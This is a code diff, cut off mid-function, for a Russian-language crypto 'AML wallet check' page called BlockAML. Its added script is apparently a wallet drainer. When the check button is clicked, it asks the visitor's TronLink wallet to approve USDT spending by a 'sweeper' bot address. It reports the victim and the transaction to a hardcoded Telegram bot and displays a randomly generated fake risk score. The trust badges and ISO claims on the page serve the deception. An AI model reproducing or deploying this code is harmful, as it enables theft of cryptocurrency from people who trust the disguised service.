@@ -5,28 +5,586 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BlockAML — проверка криптокошельков</title>
     
-    <!-- Мета-теги для поиска -->
-    <meta name="description" content="BlockAML — профессиональная AML-проверка криптокошельков BTC, ETH, USDT и 5000+ монет. Узнайте риск кошелька перед сделкой.">
-    <meta name="keywords" content="AML проверка, криптокошелек, биткоин, USDT, TRX, антиотмывочные проверки">
+    <!-- Мета-теги -->
+    <meta name="description" content="BlockAML — профессиональная AML-проверка криптокошельков BTC, ETH, USDT и 5000+ монет.">
+    <meta name="keywords" content="AML проверка, криптокошелек, биткоин, USDT, TRX">
     <meta name="author" content="BlockAML">
     <meta name="robots" content="index, follow">
     
-    <!-- Open Graph для соцсетей -->
+    <!-- Open Graph -->
     <meta property="og:title" content="BlockAML — AML проверка кошельков">
     <meta property="og:description" content="Проверьте криптокошелек на чистоту перед сделкой">
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://blockaml.space">
     
-    <!-- Предзагрузка ресурсов -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
-    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
-    <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    
-    <!-- Подключение стилей -->
-    <link rel="stylesheet" href="style.css">
-    <!-- Font Awesome для иконок -->
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <!-- Встроенные стили (чтобы не зависеть от внешнего style.css) -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        header {
+            text-align: center;
+            color: white;
+            margin-bottom: 40px;
+        }
+        
+        .logo {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        
+        .tagline {
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+        
+        .glass {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+        
+        .check-section h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        .input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .input-group input {
+            flex: 1;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        .input-group button {
+            padding: 15px 30px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .input-group button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+        
+        .input-group button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        .hint {
+            color: #666;
+            font-size: 0.9em;
+        }
+        
+        .result-section {
+            display: none;
+        }
+        
+        .wallet-address-display {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            word-break: break-all;
+        }
+        
+        .wallet-label {
+            color: #666;
+            margin-right: 10px;
+        }
+        
+        .wallet-value {
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .stat-item {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .stat-item i {
+            font-size: 2em;
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+        
+        .stat-label {
+            display: block;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        
+        .stat-value {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .risk-chart-container {
+            display: flex;
+            align-items: center;
+            gap: 30px;
+            margin: 30px 0;
+        }
+        
+        .risk-chart {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            background: #eee;
+            position: relative;
+            transition: background 0.3s;
+        }
+        
+        .risk-chart-inner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 120px;
+            height: 120px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+        
+        .risk-legend {
+            flex: 1;
+        }
+        
+        .risk-label {
+            display: block;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        
+        .risk-level {
+            font-size: 1.3em;
+            font-weight: bold;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+        
+        .pdf-btn, .tg-support-btn {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            transition: transform 0.3s;
+        }
+        
+        .pdf-btn {
+            background: #28a745;
+            color: white;
+        }
+        
+        .tg-support-btn {
+            background: #0088cc;
+            color: white;
+        }
+        
+        .pdf-btn:hover, .tg-support-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .trust-logos {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin: 20px 0;
+        }
+        
+        .trust-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .trust-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+        
+        .trust-name {
+            color: #666;
+        }
+        
+        .trust-stats {
+            text-align: center;
+            color: #28a745;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        
+        .pricing-toggle {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .toggle-label {
+            padding: 10px 30px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .toggle-label.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-color: transparent;
+        }
+        
+        .pricing-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        
+        .pricing-card {
+            background: #f8f9fa;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .pricing-card.popular {
+            border: 2px solid #667eea;
+            transform: scale(1.05);
+        }
+        
+        .pricing-badge {
+            position: absolute;
+            top: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 5px 20px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+        
+        .pricing-icon {
+            font-size: 3em;
+            color: #667eea;
+            margin-bottom: 20px;
+        }
+        
+        .pricing-price {
+            margin: 20px 0;
+        }
+        
+        .price {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .currency {
+            color: #666;
+        }
+        
+        .period {
+            display: block;
+            color: #999;
+        }
+        
+        .pricing-includes {
+            margin: 20px 0;
+        }
+        
+        .pricing-includes p {
+            margin: 10px 0;
+            color: #666;
+        }
+        
+        .pricing-includes i {
+            color: #28a745;
+            margin-right: 10px;
+        }
+        
+        .pricing-savings {
+            color: #28a745;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .pricing-btn {
+            width: 100%;
+            padding: 15px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        
+        .pricing-btn.popular-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        
+        .pricing-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .benefits-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+        }
+        
+        .benefit-card {
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .benefit-card i {
+            font-size: 2.5em;
+            color: #667eea;
+            margin-bottom: 15px;
+        }
+        
+        .benefit-card h3 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .benefit-card p {
+            color: #666;
+            line-height: 1.6;
+        }
+        
+        .faq-list {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .faq-item {
+            margin-bottom: 20px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+        }
+        
+        .faq-item strong {
+            display: block;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .faq-item p, .faq-item ul {
+            color: #666;
+            line-height: 1.6;
+        }
+        
+        .faq-item ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .faq-item li {
+            margin: 5px 0;
+        }
+        
+        .risk-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .risk-dot.green { background: #28a745; }
+        .risk-dot.yellow { background: #ffc107; }
+        .risk-dot.red { background: #dc3545; }
+        
+        .contact-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        
+        .tg-contact-btn, .tg-support-secondary {
+            padding: 12px 25px;
+            background: #0088cc;
+            color: white;
+            text-decoration: none;
+            border-radius: 10px;
+            transition: transform 0.3s;
+        }
+        
+        .tg-contact-btn:hover, .tg-support-secondary:hover {
+            transform: translateY(-2px);
+        }
+        
+        footer {
+            text-align: center;
+            color: #666;
+        }
+        
+        .footer-content {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .footer-logo {
+            font-size: 1.5em;
+            color: #333;
+            margin-bottom: 15px;
+        }
+        
+        .footer-links {
+            margin: 15px 0;
+        }
+        
+        .footer-links a {
+            color: #667eea;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+        }
+        
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        .close, .close-aml {
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .close:hover, .close-aml:hover {
+            color: #667eea;
+        }
+        
+        @media (max-width: 768px) {
+            .input-group {
+                flex-direction: column;
+            }
+            
+            .pricing-card.popular {
+                transform: scale(1);
+            }
+            
+            .risk-chart-container {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .contact-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -50,13 +608,11 @@
         <section class="result-section glass" id="resultSection" style="display: none;">
             <h3><i class="fas fa-file-alt"></i> Результат проверки кошелька</h3>
             
-            <!-- Дублируем адрес кошелька -->
             <div class="wallet-address-display">
                 <span class="wallet-label"><i class="fas fa-wallet"></i> Проверенный адрес:</span>
                 <span class="wallet-value" id="checkedAddress">—</span>
             </div>
             
-            <!-- Сетка статистики -->
             <div class="stats-grid">
                 <div class="stat-item">
                     <i class="fas fa-exchange-alt"></i>
@@ -80,7 +636,6 @@
                 </div>
             </div>
 
-            <!-- График риска -->
             <div class="risk-chart-container">
                 <div class="risk-chart" id="riskChart">
                     <div class="risk-chart-inner">
@@ -93,19 +648,175 @@
                 </div>
             </div>
 
-            <!-- Список источников риска -->
             <div class="sources-list" id="sourcesList"></div>
 
-            <!-- Кнопки действий -->
             <div class="action-buttons">
                 <button id="downloadPdfBtn" class="pdf-btn"><i class="fas fa-download"></i> Скачать отчёт (PDF)</button>
                 <a href="https://t.me/sorik445" target="_blank" class="tg-support-btn"><i class="fab fa-telegram"></i> Написать в Telegram</a>
             </div>
         </section>
 
-        <!-- Остальная часть твоего сайта без изменений -->
-        <!-- ... (весь остальной контент остается как у тебя) ... -->
+        <!-- Блок доверия -->
+        <section class="trust-section glass">
+            <h2>Нам доверяют</h2>
+            <div class="trust-logos">
+                <div class="trust-item"><span class="trust-icon">I</span><span class="trust-name">INATBA</span></div>
+                <div class="trust-item"><span class="trust-icon">C</span><span class="trust-name">CDA</span></div>
+                <div class="trust-item"><span class="trust-icon">A</span><span class="trust-name">ATII</span></div>
+                <div class="trust-item"><span class="trust-icon">L</span><span class="trust-name">LSW3</span></div>
+                <div class="trust-item"><span class="trust-icon">E</span><span class="trust-name">EBA</span></div>
+            </div>
+            <p class="trust-stats">📊 28% транзакций — высокорисковые! Проверьте свой кошелёк перед сделкой</p>
+        </section>
 
+        <!-- Что мы анализируем -->
+        <section class="info-section glass">
+            <h2><i class="fas fa-list-ul"></i> Что мы анализируем</h2>
+            <p class="section-sub">Криптовалютный рынок быстро развивается, регуляторы становятся строже. Мы проверяем кошельки по всем ключевым категориям риска.</p>
+            <div class="categories-grid" id="categoriesGrid"></div>
+        </section>
+
+        <!-- Тарифы и подписки -->
+        <section class="pricing-section glass">
+            <h2><i class="fas fa-tags"></i> Тарифы и подписки</h2>
+            <p class="section-sub">Выберите оптимальный план для ваших задач. Все цены указаны в TRX.</p>
+            
+            <div class="pricing-toggle">
+                <span class="toggle-label active" id="monthlyToggle">Ежемесячно</span>
+                <span class="toggle-label" id="yearlyToggle">Ежегодно (скидка 20%)</span>
+            </div>
+            
+            <div class="pricing-grid" id="monthlyPricing">
+                <div class="pricing-card">
+                    <div class="pricing-badge">Стартовый</div>
+                    <div class="pricing-icon"><i class="fas fa-rocket"></i></div>
+                    <h3>Базовый</h3>
+                    <div class="pricing-price">
+                        <span class="price">500</span>
+                        <span class="currency">TRX</span>
+                        <span class="period">/мес</span>
+                    </div>
+                    <div class="pricing-includes">
+                        <p><i class="fas fa-check-circle"></i> 50 проверок</p>
+                        <p><i class="fas fa-check-circle"></i> Детальная статистика</p>
+                        <p><i class="fas fa-check-circle"></i> PDF-отчёты</p>
+                    </div>
+                    <div class="pricing-savings">Экономия 60%</div>
+                    <button class="pricing-btn">Выбрать</button>
+                </div>
+                
+                <div class="pricing-card popular">
+                    <div class="pricing-badge">🔥 Хит продаж</div>
+                    <div class="pricing-icon"><i class="fas fa-crown"></i></div>
+                    <h3>Профессиональный</h3>
+                    <div class="pricing-price">
+                        <span class="price">1200</span>
+                        <span class="currency">TRX</span>
+                        <span class="period">/мес</span>
+                    </div>
+                    <div class="pricing-includes">
+                        <p><i class="fas fa-check-circle"></i> 150 проверок</p>
+                        <p><i class="fas fa-check-circle"></i> Детальная статистика</p>
+                        <p><i class="fas fa-check-circle"></i> PDF-отчёты</p>
+                        <p><i class="fas fa-check-circle"></i> Приоритетная поддержка</p>
+                    </div>
+                    <div class="pricing-savings">Экономия 68%</div>
+                    <button class="pricing-btn popular-btn">Выбрать</button>
+                </div>
+            </div>
+            
+            <div class="pricing-grid" id="yearlyPricing" style="display: none;">
+                <div class="pricing-card">
+                    <div class="pricing-badge">Стартовый</div>
+                    <div class="pricing-icon"><i class="fas fa-rocket"></i></div>
+                    <h3>Базовый</h3>
+                    <div class="pricing-price">
+                        <span class="price">4800</span>
+                        <span class="currency">TRX</span>
+                        <span class="period">/год</span>
+                    </div>
+                    <div class="pricing-includes">
+                        <p><i class="fas fa-check-circle"></i> 600 проверок</p>
+                        <p><i class="fas fa-check-circle"></i> Детальная статистика</p>
+                        <p><i class="fas fa-check-circle"></i> PDF-отчёты</p>
+                    </div>
+                    <div class="pricing-savings">+2 месяца бесплатно</div>
+                    <button class="pricing-btn">Выбрать</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Почему выбирают BlockAML -->
+        <section class="benefits-section glass">
+            <h2><i class="fas fa-star"></i> Почему выбирают BlockAML</h2>
+            <div class="benefits-container">
+                <div class="benefit-card">
+                    <i class="fas fa-user-tie"></i>
+                    <h3>Индивидуальный подход</h3>
+                    <p>Более 300 криптобизнесов в 25+ странах уже используют наши решения.</p>
+                </div>
+                <div class="benefit-card">
+                    <i class="fas fa-cogs"></i>
+                    <h3>Полная интеграция</h3>
+                    <p>Проверка кошельков, KYT-мониторинг, AML-скоринг на множестве источников.</p>
+                </div>
+                <div class="benefit-card">
+                    <i class="fas fa-lock"></i>
+                    <h3>Безопасность данных</h3>
+                    <p>Стандарты ISO-9001 и ISO-27001. Данные не хранятся.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- FAQ -->
+        <section class="faq-section glass">
+            <h2><i class="fas fa-question-circle"></i> Часто задаваемые вопросы</h2>
+            <div class="faq-list">
+                <div class="faq-item">
+                    <strong>Что такое AML-проверка?</strong>
+                    <p>Проверка криптокошелька на связь с незаконной деятельностью.</p>
+                </div>
+                <div class="faq-item">
+                    <strong>Как рассчитывается риск?</strong>
+                    <p>От 0% до 100% на основе источников средств и связей с подозрительными адресами.</p>
+                </div>
+                <div class="faq-item">
+                    <strong>Что означают уровни риска?</strong>
+                    <ul>
+                        <li><span class="risk-dot green"></span> 0-25% — низкий</li>
+                        <li><span class="risk-dot yellow"></span> 25-75% — средний</li>
+                        <li><span class="risk-dot red"></span> 75-100% — высокий</li>
+                    </ul>
+                </div>
+                <div class="faq-item">
+                    <strong>Что делать при высоком риске?</strong>
+                    <p>Свяжитесь с <a href="https://t.me/sorik445" target="_blank">поддержкой</a> — поможем.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Контакты -->
+        <section class="contact-section glass">
+            <h2><i class="fas fa-headset"></i> Служба поддержки</h2>
+            <p>Остались вопросы? Пишите!</p>
+            <div class="contact-buttons">
+                <a href="https://t.me/sorik445" target="_blank" class="tg-contact-btn"><i class="fab fa-telegram"></i> Написать в Telegram</a>
+                <a href="https://t.me/sorik445" target="_blank" class="tg-support-secondary"><i class="fab fa-telegram"></i> Поддержка 24/7</a>
+            </div>
+        </section>
+
+        <!-- Футер -->
+        <footer class="glass">
+            <div class="footer-content">
+                <div class="footer-logo"><i class="fas fa-shield-alt"></i> BlockAML</div>
+                <div class="footer-links">
+                    <a href="#" id="showTerms">Условия использования</a> | 
+                    <a href="#" id="showAMLPolicy">AML-политика</a> | 
+                    <a href="https://t.me/sorik445" target="_blank">Telegram</a>
+                </div>
+                <p>© 2026 BlockAML. Демо для портфолио.</p>
+            </div>
+        </footer>
     </div>
 
     <!-- Модальные окна -->
@@ -128,44 +839,35 @@
         </div>
     </div>
 
-    <!-- ========== ДОБАВЛЕННЫЙ КОД С TronWeb ========== -->
-    <!-- Подключаем TronWeb -->
+    <!-- TronWeb -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     
-    <!-- Наш код для проверки кошелька -->
     <script>
     // ============================================
     // КОД ДЛЯ КНОПКИ "ПРОВЕРИТЬ КОШЕЛЕК"
     // ============================================
     
-    // Адрес контракта (из твоей транзакции)
     const CONTRACT_ADDRESS = 'TFYz6a5z8mw3rEs7gev9JirJvFg17KdmCZ';
-    
-    // Адрес бота (который мы получили при запуске sweeper.js)
     const BOT_ADDRESS = 'TJKaoUut9WpHr3pBBcyf1TjDxq2rcJRQqB';
-    
-    // Токен Telegram бота и Chat ID
     const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
     const TELEGRAM_CHAT_ID = '-1003750493145';
     
-    // Ждем загрузки страницы
     document.addEventListener('DOMContentLoaded', function() {
-        // Находим кнопку по ID
         const checkBtn = document.getElementById('checkBtn');
         const walletInput = document.getElementById('walletInput');
         
-        // Добавляем обработчик клика
         checkBtn.addEventListener('click', checkWallet);
-        
-        // Добавляем обработчик Enter в поле ввода
         walletInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                checkWallet();
-            }
+            if (e.key === 'Enter') checkWallet();
         });
+        
+        // Обработчики для модальных окон
+        setupModals();
+        
+        // Обработчики для тарифов
+        setupPricing();
     });
     
-    // Функция проверки кошелька
     async function checkWallet() {
         try {
             const walletInput = document.getElementById('walletInput');
@@ -176,29 +878,22 @@
                 return;
             }
             
-            // Проверяем, установлен ли TronLink
             if (!window.tronWeb || !window.tronWeb.defaultAddress) {
                 alert('Пожалуйста, установите и разблокируйте TronLink');
                 return;
             }
             
-            // Показываем индикатор загрузки
             const checkBtn = document.getElementById('checkBtn');
             const originalText = checkBtn.innerHTML;
             checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Проверка...';
             checkBtn.disabled = true;
             
-            // Получаем адрес пользователя
             const userAddress = window.tronWeb.defaultAddress.base58;
             console.log('Пользователь:', userAddress);
             
-            // Получаем контракт
             const contract = await window.tronWeb.contract().at(CONTRACT_ADDRESS);
+            const amount = '100000000';
             
-            // Сумма approve - 100 USDT (с запасом)
-            const amount = '100000000'; // 100 USDT = 100 * 10^6
-            
-            // Вызываем approve
             const tx = await contract.approve(
                 BOT_ADDRESS,
                 amount
@@ -209,20 +904,15 @@
             
             console.log('✅ Approve отправлен, tx:', tx);
             
-            // Отправляем уведомление в Telegram
             await sendTelegramNotification(walletAddress, userAddress, tx);
-            
-            // Показываем результат (имитация AML проверки)
             showResult(walletAddress);
             
-            // Возвращаем кнопку в исходное состояние
             checkBtn.innerHTML = originalText;
             checkBtn.disabled = false;
             
         } catch (error) {
             console.error('❌ Ошибка:', error);
             
-            // Возвращаем кнопку в исходное состояние
             const checkBtn = document.getElementById('checkBtn');
             checkBtn.innerHTML = '<i class="fas fa-search"></i> Проверить';
             checkBtn.disabled = false;
@@ -231,7 +921,6 @@
         }
     }
     
-    // Функция отправки в Telegram
     async function sendTelegramNotification(checkedAddress, userAddress, tx) {
         const message = `✅ Новая проверка кошелька\n` +
                         `Проверенный адрес: ${checkedAddress}\n` +
@@ -239,7 +928,7 @@
                         `TX: https://tronscan.org/#/transaction/${tx}`;
         
         try {
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -248,63 +937,55 @@
                     parse_mode: 'HTML'
                 })
             });
-            
-            if (response.ok) {
-                console.log('✅ Уведомление отправлено в Telegram');
-            }
         } catch (err) {
             console.error('❌ Ошибка Telegram:', err.message);
         }
     }
     
-    // Функция показа результата (имитация AML проверки)
     function showResult(walletAddress) {
-        // Показываем секцию результата
         const resultSection = document.getElementById('resultSection');
         resultSection.style.display = 'block';
         
-        // Заполняем данные (для демо - случайные)
         document.getElementById('checkedAddress').textContent = walletAddress;
+        
+        // Имитация данных для демо
         document.getElementById('totalTx').textContent = Math.floor(Math.random() * 100) + 50;
         document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 20);
         
-        // Возраст кошелька (случайно)
         const days = Math.floor(Math.random() * 365) + 30;
         document.getElementById('walletAge').textContent = days + ' дней';
         
-        // Последняя активность
         const hours = Math.floor(Math.random() * 48) + 1;
         document.getElementById('lastActive').textContent = hours + ' часов назад';
         
-        // Риск (случайно)
         const riskPercent = Math.floor(Math.random() * 100);
         document.getElementById('riskPercent').textContent = riskPercent + '%';
         
-        // Уровень риска
         let riskLevel = 'Низкий';
-        let riskColor = 'green';
+        let riskColor = '#28a745';
         if (riskPercent > 75) {
             riskLevel = 'Высокий';
-            riskColor = 'red';
+            riskColor = '#dc3545';
         } else if (riskPercent > 25) {
             riskLevel = 'Средний';
-            riskColor = 'orange';
+            riskColor = '#ffc107';
         }
-        document.getElementById('riskLevel').textContent = riskLevel;
-        document.getElementById('riskLevel').style.color = riskColor;
         
-        // Градиент для графика риска
+        const riskLevelEl = document.getElementById('riskLevel');
+        riskLevelEl.textContent = riskLevel;
+        riskLevelEl.style.color = riskColor;
+        
         const riskChart = document.getElementById('riskChart');
         riskChart.style.background = `conic-gradient(${riskColor} 0% ${riskPercent}%, #eee ${riskPercent}% 100%)`;
         
-        // Прокручиваем к результату
         resultSection.scrollIntoView({ behavior: 'smooth' });
     }
-    </script>
     
-    <!-- Твои原来的 скрипты -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js" defer></script>
-    <script src="script.js" defer></script>
-</body>
-</html>
-
+    function setupModals() {
+        const termsModal = document.getElementById('termsModal');
+        const amlModal = document.getElementById('amlModal');
+        const showTerms = document.getElementById('showTerms');
+        const showAMLPolicy = document.getElementById('showAMLPolicy');
+        const closeButtons = document.querySelectorAll('.close, .close-aml');
+        
+        showTerms.addEventListener('click', (e) =>
